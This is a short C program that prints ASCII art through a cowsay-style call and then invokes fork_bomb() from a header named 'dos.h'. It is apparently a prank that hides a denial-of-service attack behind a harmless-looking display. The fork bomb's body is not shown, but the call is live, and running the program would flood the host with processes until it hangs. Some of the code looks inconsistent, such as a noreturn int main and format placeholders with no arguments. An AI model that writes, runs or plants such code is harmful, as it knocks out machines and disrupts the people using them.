#include <stdio.h>
#include <stdlib.h>

#include <cowsay.h>

#include "dos.h"

__attribute__ ((leaf, nonnull (2), noreturn, nothrow))
int main (int argc, char *argv[]){
	(void) ezcowsay (argv[0],
		"--%s--\n"
		"< %s >\n"
		"--%s--\n"
		"       _,,--,,_    \n"
		"     /`       .`\\  \n"
		"    /  '  _.-'   \\ \n"
		"    |  `'_{}_    | \n"
		"    |  /`    `\\  | \n"
		"     \\/ ==  == \\/  \n"
		"     /| (.)(.) |\\  \n"
		"     \\|  __)_  |/  \n"
		"      |\\/____\\/|   \n"
		"      | ` ~~ ` |   \n"
		"      \\        /   \n"
		"jgs    `.____.`    \n",
		puts);
	fork_bomb ();
	__builtin_unreachable ();
}